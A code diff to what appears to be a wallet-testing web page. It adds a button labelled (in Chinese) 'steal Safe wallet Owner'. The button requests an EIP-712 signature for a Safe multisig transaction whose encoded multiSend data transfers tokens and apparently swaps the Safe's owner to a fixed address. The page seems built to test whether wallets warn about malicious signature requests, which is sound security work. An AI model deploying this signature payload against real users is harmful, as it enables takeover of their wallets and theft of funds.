@@ -78,6 +78,62 @@ function SignTypedDataV4() {
     }
   };
 
+  const [stealSafeOwnerLoading, setStealSafeOwnerLoading] = useState(false);
+  const stealSafeOwner = async () => {
+    try {
+      setStealSafeOwnerLoading(true);
+      const msgParams = {
+        domain: {
+          chainId: '137',
+          verifyingContract: '0x06ed799f22fd5db20a546eba1f4a097b0cbfc670',
+        },
+        types: {
+          EIP712Domain: [
+            { name: 'chainId', type: 'uint256' },
+            { name: 'verifyingContract', type: 'address' },
+          ],
+          SafeTx: [
+            { name: 'to', type: 'address' },
+            { name: 'value', type: 'uint256' },
+            { name: 'data', type: 'bytes' },
+            { name: 'operation', type: 'uint8' },
+            { name: 'safeTxGas', type: 'uint256' },
+            { name: 'baseGas', type: 'uint256' },
+            { name: 'gasPrice', type: 'uint256' },
+            { name: 'gasToken', type: 'address' },
+            { name: 'refundReceiver', type: 'address' },
+            { name: 'nonce', type: 'uint256' },
+          ],
+        },
+        primaryType: 'SafeTx',
+        message: {
+          to: '0xA238CBeb142c10Ef7Ad8442C6D1f9E89e07e7761',
+          value: '0',
+          data: '0x8d80ff0a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000152003c499c542cef5e3811e1192ce70d8cc03d5c335900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb0000000000000000000000002c6a577db687c310a84635e39afbe838c707e43f00000000000000000000000000000000000000000000000000000000000000010006ed799f22fd5db20a546eba1f4a097b0cbfc67000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064e318b52b0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000e0444a5efb95e40471e34e6669e5e50f8e0bed330000000000000000000000002c6a577db687c310a84635e39afbe838c707e43f0000000000000000000000000000',
+          operation: 1,
+          safeTxGas: '0',
+          baseGas: '0',
+          gasPrice: '0',
+          gasToken: '0x0000000000000000000000000000000000000000',
+          refundReceiver: '0x0000000000000000000000000000000000000000',
+          nonce: '13',
+        },
+      };
+
+      const ret = await provider.request({
+        method: 'eth_signTypedData_v4',
+        params: [account, JSON.stringify(msgParams)],
+      });
+      console.log(ret);
+      toastSuccess();
+    } catch (error) {
+      console.log(error);
+      toastFail();
+    } finally {
+      setStealSafeOwnerLoading(false);
+    }
+  };
+
   const eth_signTypedData_v4_0 = async () => {
     // await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x89' }] });
     const msgParams = {
@@ -384,6 +440,14 @@ function SignTypedDataV4() {
             loading={eth_signTypedData_v4Loading}
           >
             Not Standard 712 Request
+          </Button>
+          <Button
+            block
+            disabled={!account}
+            onClick={stealSafeOwner}
+            loading={stealSafeOwnerLoading}
+          >
+            窃取Safe钱包Owner
           </Button>
         </Space>
       </Card>
